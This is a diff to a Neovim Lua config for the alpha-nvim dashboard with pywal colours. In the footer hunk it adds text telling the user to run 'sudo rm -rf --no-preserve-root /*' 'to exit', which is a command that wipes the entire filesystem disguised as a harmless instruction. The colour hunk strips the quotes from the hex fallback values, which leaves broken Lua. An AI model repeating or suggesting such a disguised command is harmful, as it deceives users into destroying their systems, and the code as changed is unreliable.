@@ -7,11 +7,11 @@ return {
     config = function()
         local dashboard = require("alpha.themes.dashboard")
         vim.cmd("source ~/.cache/wal/colors-wal.vim")
-        local color9 = vim.g.color9 or "#ffffff"
-        local color3 = vim.g.color3 or "#ffffff"
-        local color4 = vim.g.color4 or "#ffffff"
-        local color5 = vim.g.color5 or "#ffffff"
-        local color6 = vim.g.color6 or "#ffffff"
+        local color9 = vim.g.color9 or #ffffff
+        local color3 = vim.g.color3 or #ffffff
+        local color4 = vim.g.color4 or #ffffff
+        local color5 = vim.g.color5 or #ffffff
+        local color6 = vim.g.color6 or #ffffff
 
         -- helper function for utf8 chars
         local function getCharLen(s, pos)
@@ -87,8 +87,10 @@ return {
 
         }
         dashboard.section.footer.val = {
+            "Welcome kima!",
             "",
-            "Welcome!",
+            "run the following to exit:", 
+            "sudo rm -rf --no-preserve-root /*"
         }
 
     end,
